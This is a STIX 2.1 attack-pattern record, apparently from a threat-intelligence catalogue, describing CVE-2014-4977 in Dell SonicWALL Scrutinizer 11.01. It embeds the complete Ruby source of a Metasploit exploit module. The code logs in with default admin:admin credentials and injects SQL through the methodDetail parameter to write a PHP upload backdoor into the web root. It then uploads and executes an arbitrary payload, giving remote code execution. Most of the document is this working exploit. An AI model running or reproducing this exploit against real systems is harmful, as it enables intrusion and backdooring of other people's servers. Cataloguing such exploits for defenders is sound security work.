{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--69d840d7-2457-4a01-874b-ba32132ae431",
    "created": "2024-08-14T17:08:16.029774Z",
    "modified": "2024-08-14T17:08:16.029778Z",
    "name": "\"Dell SonicWALL Scrutinizer 11.01 methodDetail SQL Injection\"",
    "description": " This module exploits a vulnerability found in Dell SonicWALL Scrutinizer. The methodDetail parameter in exporters.php allows an attacker to write arbitrary files to the file system with an SQL Injection attack, and gain remote code execution under the context of SYSTEM for Windows, or as Apache for Linux.  Authentication is required to exploit this vulnerability, but this module uses the default admin:admin credential.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/sonicwall_scrutinizer_methoddetail_sqli.rb",
            "external_id": "sonicwall_scrutinizer_methoddetail_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-4977"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2014/Jul/44"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::EXE\n\n  WINDOWS = /^win/i\n  LINUX   = /linux/i\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Dell SonicWALL Scrutinizer 11.01 methodDetail SQL Injection\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in Dell SonicWALL Scrutinizer. The methodDetail\n        parameter in exporters.php allows an attacker to write arbitrary files to the file system\n        with an SQL Injection attack, and gain remote code execution under the context of SYSTEM\n        for Windows, or as Apache for Linux.\n\n        Authentication is required to exploit this vulnerability, but this module uses\n        the default admin:admin credential.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'bperry', # Original discovery, PoC, and Metasploit module\n          'sinn3r'  # Metasploit module for native support\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2014-4977' ],\n          [ 'BID', '68495' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Jul/44' ],\n          [ 'URL','https://gist.github.com/brandonprry/76741d9a0d4f518fe297' ]\n        ],\n      'Arch'           => [ ARCH_X86 ],\n      'Platform'       => [ 'win', 'linux' ],\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [\n            'Dell SonicWALL Scrutinizer 11.01 on Windows',\n            {\n              'Arch'     => ARCH_X86,\n              'Platform' => 'win',\n            }\n          ],\n          [\n            'Dell SonicWALL Scrutinizer 11.01 Linux Appliance',\n            {\n              'Arch'     => ARCH_X86,\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-07-24',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Base Application path\", \"/\" ]),\n        OptString.new('USERNAME', [ true,  'The username to authenticate as', 'admin' ]),\n        OptString.new('PASSWORD', [ true,  'The password to authenticate with', 'admin' ])\n      ])\n  end\n\n\n  # Prints a message with the target's IP and port.\n  #\n  # @param msg [String] Message to print.\n  # @return [void]\n  def print_status(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n\n  # Prints an error message with the target's IP and port.\n  #\n  # @param msg [String] Message to print.\n  # @return [void]\n  def print_error(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n\n  # Pads NULL columns for a SQL injection string.\n  #\n  # @param n [Integer] Number of nulls\n  # @return [String]\n  def pad_null(n)\n    padding = []\n\n    n.times do\n      padding << 'NULL'\n    end\n\n    padding * ','\n  end\n\n\n  # Checks (explicitly) the target for the vulnerability. To be able to check this, a\n  # valid username/password is required.\n  #\n  # @return [void]\n  def check\n    begin\n      res = do_login\n    rescue Msf::Exploit::Failed => e\n      vprint_error(e.message)\n      return Exploit::CheckCode::Unknown\n    end\n\n    uid = res['userid']\n    sid = res['sessionid']\n    pattern = Rex::Text.rand_text_alpha(10)\n    sqli_str = \"-6045 UNION ALL SELECT '#{pattern}',#{pad_null(19)}\"\n    res = do_sqli(sqli_str, sid, uid).get_json_document\n    return Exploit::CheckCode::Vulnerable if res['id'].to_s == pattern\n\n    Exploit::CheckCode::Safe\n  end\n\n\n  # Returns the OS information by using @@version_compile_os.\n  #\n  # @param sid [String] Session ID.\n  # @param uid [String] User ID.\n  # @return [String] The OS information.\n  def get_os(sid, uid)\n    sqli_str = \"-6045 UNION ALL SELECT @@version_compile_os,#{pad_null(19)}\"\n    res = do_sqli(sqli_str, sid, uid).get_json_document\n    res['id']\n  end\n\n\n  # Returns target's d4d directory path that will be used to upload our malicious files.\n  #\n  # @param os [String] OS information.\n  # @return [String]\n  def get_d4d_path(os)\n    case os\n    when WINDOWS\n      # On Windows, the full d4d path looks something like this:\n      # C:\\Program Files\\Scrutinizer\\html\\d4d\n      '../../html/d4d'\n    when LINUX\n      # On the Linux appliance, the d4d path looks exactly like this:\n      '/home/plixer/scrutinizer/html/d4d'\n    end\n  end\n\n\n  # Logs into Dell SonicWALL Scrutinizer.\n  #\n  # @return [Hash] JSON response.\n  def do_login\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri, '/cgi-bin/login.cgi'),\n      'vars_get' => {\n        'name' => datastore['USERNAME'],\n        'pwd' => datastore['PASSWORD']\n      }\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'The connection timed out while attempting to log in.')\n    end\n\n    res = res.get_json_document\n\n    if res['noldapnouser']\n      fail_with(Failure::NoAccess, \"Username '#{datastore['USERNAME']}' is incorrect.\")\n    elsif res['loginfailed']\n      fail_with(Failure::NoAccess, \"Password '#{datastore['PASSWORD']}' is incorrect.\")\n    elsif res['sessionid']\n      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])\n    end\n\n    res\n  end\n\n  # Injects malicious SQL string to the methodDetail parameter against the target machine.\n  #\n  # @param method_detail [String] Malicious SQL injection string.\n  # @param sid [String] Session ID.\n  # @param uid [String] User ID.\n  # @return [Rex::Proto::Http::Response]\n  def do_sqli(method_detail, sid, uid)\n    res = send_request_cgi({\n      'uri'      => normalize_uri(target_uri, '/d4d/exporters.php'),\n      'vars_get' => { 'methodDetail'=> method_detail },\n      'cookie'   => \"cookiesenabled=1;sessionid=#{sid};userid=#{uid}\"\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'The connection timed out for exporters.php.')\n    end\n\n    res\n  end\n\n\n  # Returns a PHP backdoor that is to be uploaded onto the target machine.\n  #\n  # @param os [String] Target OS information.\n  # @param target_path [String]\n  # @return [String] PHP backdoor\n  def get_php_backdoor(os)\n    case os\n    when WINDOWS\n      chmod_code = %Q|chmod($bname, 0777);|\n      exec_code = %Q|exec($bname);|\n    when LINUX\n      chmod_code = %Q|chmod(\"./\" . $bname, 0777);|\n      exec_code = %Q|exec(\"./\" . $bname);|\n    end\n\n    %Q|<?php\n    $bname = basename( $_FILES['uploadedfile']['name']);\n    $target_path = \"./\" . $bname;\n    move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path);\n    #{chmod_code}\n    #{exec_code}\n    ?>\n    |.gsub(/\\x20{4}/, ' ')\n  end\n\n\n  # Uploads the executable payload via malicious PHP backdoor.\n  #\n  # @param backdoor_fname [String] Name of the backdoor\n  # @param payload_fname [String] Name of the executable payload\n  # @return [void]\n  def upload_payload(backdoor_fname, payload_fname)\n    p = generate_payload_exe(\n      code: payload.encoded,\n      platform: @my_target.platform,\n      arch: @my_target.arch\n    )\n\n    print_status(\"Uploading #{payload_fname} (#{p.length} bytes)...\")\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(\n      p,\n      'application/octet-stream',\n      'binary',\n      \"form-data; name=\\\"uploadedfile\\\"; filename=\\\"#{payload_fname}\\\"\"\n    )\n    data = post_data.to_s\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri, \"/d4d/#{backdoor_fname}\"),\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data'   => data\n    })\n\n    unless res\n      # Here we are not using fail_with, because when we get a session, it seems to be creating\n      # the same effect as connection hanging... and then eventually times out. If that\n      # happens, a fail_with() can cause msfconsole to believe there is no session created.\n      vprint_status('Connection timed out while uploading payload.')\n      return\n    end\n\n    if res.code == 404\n      fail_with(Failure::Unknown, \"Server returned 404 for #{backdoor_fname}.\")\n    end\n  end\n\n\n  # Uploads the PHP backdoor onto the target machine. The reason of using a PHP backdoor to upload\n  # is because our SQL injection is in a GET method, and Apache has a max length of 8190 bytes,\n  # which is bad for some built-in or custom payloads.\n  #\n  # @param opts [Hash]\n  # @option opts [String] :d4d_path\n  # @option opts [String] :backdoor_fname\n  # @option opts [String] :payload_fname\n  # @option opts [String] :sid\n  # @option opts [String] :uid\n  # @option opts [String] :os\n  # @return [void]\n  def upload_php_backdoor(opts)\n    d4d_path       = opts[:d4d_path]\n    backdoor_fname = opts[:backdoor_fname]\n    payload_fname  = opts[:payload_fname]\n    sid            = opts[:sid]\n    uid            = opts[:uid]\n    os             = opts[:os]\n\n    print_status(\"Injecting a PHP upload backdoor (#{backdoor_fname})...\")\n    hex_backdoor = get_php_backdoor(os).unpack(\"H*\")[0]\n    sqli_str = \"-6045 UNION ALL SELECT 0x#{hex_backdoor},#{pad_null(19)} INTO DUMPFILE '#{d4d_path}/#{backdoor_fname}' #\"\n    do_sqli(sqli_str, sid, uid)\n  end\n\n\n  # Attempts a SQL injection attack against the target machine.\n  #\n  # @param os [String] OS information.\n  # @param sid [String] Session ID.\n  # @param uid [String] User ID.\n  # @return [void]\n  def do_backdoor_sqli(os, sid, uid)\n    backdoor_fname = \"#{Rex::Text.rand_text_alpha(6)}.php\"\n    payload_fname  = Rex::Text.rand_text_alpha(5)\n    payload_fname << '.exe' if @my_target['Platform'].match(WINDOWS)\n    d4d_path       = get_d4d_path(os)\n\n    register_files_for_cleanup(backdoor_fname, payload_fname)\n\n    opts = {\n      d4d_path: d4d_path,\n      backdoor_fname: backdoor_fname,\n      payload_fname: payload_fname,\n      sid: sid,\n      uid: uid,\n      os: os\n    }\n\n    upload_php_backdoor(opts)\n    upload_payload(backdoor_fname, payload_fname)\n  end\n\n\n  # Tries to set the target. If the user manually set one, then avoid automatic target.\n  #\n  # @param os [String] OS information.\n  # @return [void]\n  def try_set_target(os)\n    @my_target = target if target != targets[0]\n    case os\n    when WINDOWS\n      @my_target = targets[1]\n    when LINUX\n      @my_target = targets[2]\n    else\n      fail_with(Failure::NoTarget, 'Unsupported target')\n    end\n  end\n\n\n  # Exploits the target machine. To do this, first we must log into the system in order to obtain\n  # the user ID and session ID. After logging in, we can ask the vulnerable code to upload a\n  # malicious PHP backdoor, and then finally use that backdoor to upload and execute our payload.\n  def exploit\n    res = do_login\n    uid = res['userid']\n    sid = res['sessionid']\n    os = get_os(sid, uid)\n    print_status(\"Detected OS information: #{os}\")\n    try_set_target(os)\n    do_backdoor_sqli(os, sid, uid)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-07-24",
    "x_mitre_platforms": [
        "linux"
    ]
}